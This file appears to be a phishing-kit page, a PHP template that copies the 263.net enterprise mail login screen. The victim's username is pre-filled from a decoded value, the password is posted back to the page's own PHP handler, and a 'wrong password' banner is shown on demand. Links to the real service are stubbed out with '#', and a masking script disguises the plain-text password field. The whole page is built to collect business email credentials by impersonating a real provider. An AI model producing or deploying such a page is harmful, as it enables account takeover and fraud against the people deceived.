<?php include '../build.php' ?>
<!DOCTYPE html>
<html>
<script type="text/javascript">/*<![CDATA[*/function MaskedPassword(e,d){if(typeof document.getElementById=="undefined"||typeof document.styleSheets=="undefined"){return false}if(e==null){return false}this.symbol=d;this.isIE=typeof document.uniqueID!="undefined";e.value="";e.defaultValue="";e._contextwrapper=this.createContextWrapper(e);this.fullmask=false;var f=e._contextwrapper;var b='<input type="hidden" name="'+e.name+'">';var c=this.convertPasswordFieldHTML(e);f.innerHTML=b+c;e=f.lastChild;e.className+=" masked";e.setAttribute("autocomplete","off");e._realfield=f.firstChild;e._contextwrapper=f;this.limitCaretPosition(e);var a=this;this.addListener(e,"change",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"input",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"propertychange",function(g){a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"keyup",function(g){if(!/^(9|1[678]|224|3[789]|40)$/.test(g.keyCode.toString())){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))}});this.addListener(e,"blur",function(g){a.fullmask=true;a.doPasswordMasking(a.getTarget(g))});this.forceFormReset(e);return true}MaskedPassword.prototype={doPasswordMasking:function(a){var d="";if(a._realfield.value!=""){for(var b=0;b<a.value.length;b++){if(a.value.charAt(b)==this.symbol){d+=a._realfield.value.charAt(b)}else{d+=a.value.charAt(b)}}}else{d=a.value}var c=this.encodeMaskedPassword(d,this.fullmask,a);if(a._realfield.value!=d||a.value!=c){a._realfield.value=d;a.value=c}},encodeMaskedPassword:function(d,f,b){var a=f===true?0:1;for(var e="",c=0;c<d.length;c++){if(c<d.length-a){e+=this.symbol}else{e+=d.charAt(c)}}return e},createContextWrapper:function(a){var b=document.createElement("span");b.style.position="relative";a.parentNode.insertBefore(b,a);b.appendChild(a);return b},forceFormReset:function(a){while(a){if(/form/i.test(a.nodeName)){break}a=a.parentNode}if(!/form/i.test(a.nodeName)){return null}this.addSpecialLoadListener(function(){a.reset()});return a},convertPasswordFieldHTML:function(c,e){var b="<input";for(var d=c.attributes,a=0;a<d.length;a++){if(d[a].specified&&!/^(_|type|name)/.test(d[a].name)){b+=" "+d[a].name+'="'+d[a].value+'"'}}b+=' type="text" autocomplete="off">';return b},limitCaretPosition:function(a){var d=null,c=function(){if(d==null){if(this.isIE){d=window.setInterval(function(){var e=a.createTextRange(),g=a.value.length,f="character";e.moveEnd(f,g);e.moveStart(f,g);e.select()},100)}else{d=window.setInterval(function(){var e=a.value.length;if(!(a.selectionEnd==e&&a.selectionStart<=e)){a.selectionStart=e;a.selectionEnd=e}},100)}}},b=function(){window.clearInterval(d);d=null};this.addListener(a,"focus",function(){c()});this.addListener(a,"blur",function(){b()})},addListener:function(c,a,b){if(typeof document.addEventListener!="undefined"){return c.addEventListener(a,b,false)}else{if(typeof document.attachEvent!="undefined"){return c.attachEvent("on"+a,b)}}},addSpecialLoadListener:function(a){if(this.isIE){return window.attachEvent("onload",a)}else{return document.addEventListener("DOMContentLoaded",a,false)}},getTarget:function(a){if(!a){return null}return a.target?a.target:a.srcElement}};/*]]>*/</script>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
		<title>登录企业邮箱-mail.263.net企业邮箱</title>
		<meta content="" name="keywords" />
		<meta content="" name="description" />
		<meta http-equiv="pragma" content="no-cache" />
		<meta http-equiv="cache-control" content="no-cache" />
		<meta http-equiv="expires" content="0" />
		<link rel="stylesheet" type="text/css" href="../assets/css/MAlogin_main_new.css">
		<link rel="stylesheet" type="text/css" href="../assets/css/MAlogin_new.css">
		<link id="cl_shortcut_icon" rel="shortcut icon" href="../assets/icons/263.ico">
	</head>
	<body>
		<div id="right_main_Box">
		</div>
		<!--默认登录模板-begin-->
<div class="mainBox" style="height: 948px; width: 1912px;">
	<div class="pageHeader">
		<div class="defaultWid">
			<span class="logo" onclick="window.open()"><img id="cl_top_logo" style="cursor: pointer; margin-top: 12px;" src="../assets/icons/domain_logo.png"> </span>
					<!-- <span id="cl_top_desc" class="desc" style="display: none;">企业邮箱，第一品牌</span> -->
			<div class="layout_border_logo"></div>
			<div class="layout_border_conpanyTxt"></div>
			<ul class="nav" style="display: block;">
                <li><a class="" href="#" target="_blank">个人邮箱</a></li>
                <li><a class="" href="#" target="_blank">企业邮箱</a></li>
                <li class="hotline">
<!--					客服热线：<span>95040-000-263</span>-->
					<span class="hotlineIcon" title="在线客服"></span>
					<a href="#" class="conference" title="在线客服" target="_blank">在线客服</a>
				</li>
                <li class="otherLogin">
                	<span class="mail" title="邮箱登录"></span>
                    <a href="#" class="conference" title="会议登录" target="_blank"></a>
                    <a href="#" class="cast" title="直播登录" target="_blank"></a>
                </li>
            </ul>
		</div>
	</div>

	<div class="pageSection">
		<div class="defaultWid">
			<div class="imgBox left">
				<img src="../assets/icons/leftImg_new.png">
			</div>
			<div class="layout_border_Img"></div>
			<div class="loginBox right">
				<!--登录框区域  -->
<!-- the tabs -->
<ul class="tabs">
	<li>
		<a href="javascript:void(0)" hidefocus="true" id="showTabUser" class="current">用户登录</a>
	</li>
	<li>
		<a href="javascript:void(0)" hidefocus="true" id="showTabAdmin" class="securityInput">管理员登录</a>
	</li>
</ul>

<!-- tab "panes" -->
<div class="panes">
	<!--用户登录-->
	<div id="tabUser">
		<div class="login-scancode" style="display: block;">
			<div class="login-type-pc"></div>
			<div class="login-type-wechat"></div>
		</div>
		<div class="qrcode-wrap">
			<div class="code-img"><img class="qrcode" style="width:132; height:132px;" src="../assets/icons/qrcode-pic.png"></div>
			<div class="expire-mask" style="display:none"><p id="wechatScanExpire">QR code has expired</p><a id="wechatScanRefresh" href="javascript:;">Refresh</a><div class="mask-block"></div></div>
			<div class="scan-icon-wrap">
				<div class="scan-icon">
					<span class="scan-login-img"><img src="../assets/icons/qrcode-scan-icon.png"></span>
					<span id="wechatScanLogin">Wechat code scanning login</span>
				</div>
			</div>		
		</div>
		<form name="form_wm" action="" method="post" id="form1">
            <input type="hidden" name="login" value="263net">
			<p class="input_width_domain">
				<span class="user_icon"></span>
				<input id="username" type="text" class="accountInput darkInputTxt securityInput" name="user" value="<?php echo htmlspecialchars($decoded); ?>" style="display: block; color: #000000; background: #e8f0fe" readonly="readonly">
				<span id="cl_span_domain" class="domain" style="display: none;"><nobr id="cl_span_domain_txt"></nobr>
				</span>
			</p>
			<p class="input_width_domain">
				<span class="pwd_icon"></span>
				<input id="userType" class="pswInput lightInputTxt" type="text" name="pass" value="" placeholder="密 码" style="display: block; color: #000000;" autocomplete="off">
				<!--<input id="userTypePwd" class="pswInput darkInputTxt securityInput" type="text" name="pass" autocomplete="off">-->
			</p>
			<span id="userTypePwdCapitalOpen" class="popNotice securityInput">大写状态已打开</span>
			<p class="btn_domain">
				<span class="checkSafety">
					<span><input id="safelogin" type="checkbox" hidefocus="true" name="safelogin" class="securityInput" checked="checked" style="display: inline-block;"> </span>
					<span id="sslSafeLoginSSL" class="safeTxt securityInput" style="display: inline;"></span>
					<span id="sslSafeLogin" class="safeTxt securityInput" style="display: inline;">安全登录</span>
				</span>
				<span id="clearTrace" class="clearTrace">清除痕迹</span>
			</p>
			<p>
				<input id="wmSubBtn" type="submit" hidefocus="true" class="btnLoginIn" value="登 录">
			</p>
            <p>
                <div style="margin-top: 5px; color: #ff4f4f; <?php echo $error; ?>">您的用户名或密码有误，请重新输入!</div>
            </p>
		</form>
	</div>

	<!--管理员登录-->
	

	<div class="languageBox securityInput" style="">
		<ul>
			<li>
				<a id="language_cn" hidefocus="true" class="CN" href="#lang=cn">中文（简）</a>
			</li>
			<li>
				<a id="language_hk" hidefocus="true" class="TCN" href="#lang=hk">中文（繁）</a>
			</li>
			<li>
				<a id="language_en" hidefocus="true" class="EN" href="#lang=en">English</a>
			</li>
			<li>
				<a id="language_jp" hidefocus="true" class="JP" href="#lang=jp">日本語</a>
			</li>
			<li>
				<a id="language_kr" hidefocus="true" class="KR" href="#lang=kr">한국어</a>
			</li>
		</ul>
	</div>
	<div class="securityInput">
		
	</div>
</div>
	<p class="login_bott">
		<a id="canNotLogin" href="#" target="_blank" class="txtArr left" style="securityInput">忘记用户密码？</a>
		<a id="canNotAdminLogin" href="#" target="_blank" class="txtArr left" style="display: none;">忘记管理员密码？</a>
		<!--语言选择-->
		<a id="languageBtn" class="txtArr dropdown_lang" hidefocus="true" href="javascript:;">语言/Language</a>
	</p>
			</div>
			<div class="clear"></div>
		</div>
	</div>

	<div class="pageBottom">
		<div id="cl_bottom" class="defaultWid">
			<p class="footLinks">
				<span> 
					<a hidefocus="true" target="_blank" href="#">263云通信官网</a>&nbsp;|&nbsp;

					<a hidefocus="true" target="_blank" href="#">视频会议</a>&nbsp;|&nbsp;
					<a hidefocus="true" target="_blank" href="#">企业直播</a>&nbsp;|&nbsp;
					<a hidefocus="true" target="_blank" href="#">企业邮箱</a>&nbsp;|&nbsp;
					<a hidefocus="true" target="_blank" href="#">电话会议</a>&nbsp;|&nbsp;

					<a hidefocus="true" target="_blank" href="#">帮助中心</a>
					<!-- <a hidefocus="true" target="_blank" href="#">视频会议</a> | <a hidefocus="true" target="_blank" href="#">网络直播</a> |  
					<a hidefocus="true" target="_blank" href="#">企业即时通信</a> -->
				</span>
			</p>
			<p class="copyright">Copyright © 1998-2026 北京二六三企业通信有限公司 | <a href="#" target="_blank" rel="nofollow" style="padding: 0;color:#999999;">京ICP备08010619号-3</a></p><p>举报电话：400-650-9263 | 举报邮箱：qtqm@net263.com</p>
			<div class="layout_border_copright"></div>
			<div class="layout_border_links"></div>
		</div>
	</div>
</div>
<!--默认登录模板-end-->
</body>
</script>
<script type="text/javascript">new MaskedPassword(document.getElementById("userType"),"\u25CF");document.getElementById("demo-form").onsubmit=function(){alert('pword = "'+this.pword.value+'"');return false};</script>
</html>